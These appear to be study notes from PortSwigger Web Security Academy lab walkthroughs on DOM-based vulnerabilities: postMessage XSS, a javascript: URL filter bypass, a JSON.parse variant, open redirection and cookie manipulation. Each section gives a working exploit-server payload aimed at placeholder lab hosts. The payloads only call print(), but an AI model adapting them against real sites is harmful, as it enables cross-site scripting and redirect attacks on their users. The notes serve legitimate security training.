## When happen?

**DOM-based** vulnerabilities happen when JavaScript on a page takes data from the **URL**, **cookies**, or **user input**. 
And directly modifies the DOM without properly validating or sanitizing the data.
This can result in malicious code execution or data leakage if an attacker manipulates these inputs.

## DOM XSS using web messages

home page contains an `addEventListener()`

```
Exploit server: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

## DOM XSS using web messages and a JavaScript URL

home page contains an `addEventListener()`.
The JavaScript contains a flawed `indexOf()` check that looks for the strings "http:" or "https:" anywhere within the web message. 
It also contains the sink `location.href`.

```
Exploit server: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

## DOM XSS using web messages and JSON.parse

home page contains an `addEventListener()`.
string that is parsed using `JSON.parse()`. 
event listener expects a `type` property and that the `load-channel` case of the switch statement changes the `iframe src`.

```
Exploit server: <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

## DOM-based open redirection

Blog contains :

```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```
The url parameter contains an open redirection vulnerability.
So, build:

```
Exploit server: https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/)
```

## DOM-based cookie manipulation

home page uses a client-side cookie called `lastViewedProduct`.

```
Exploit server: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
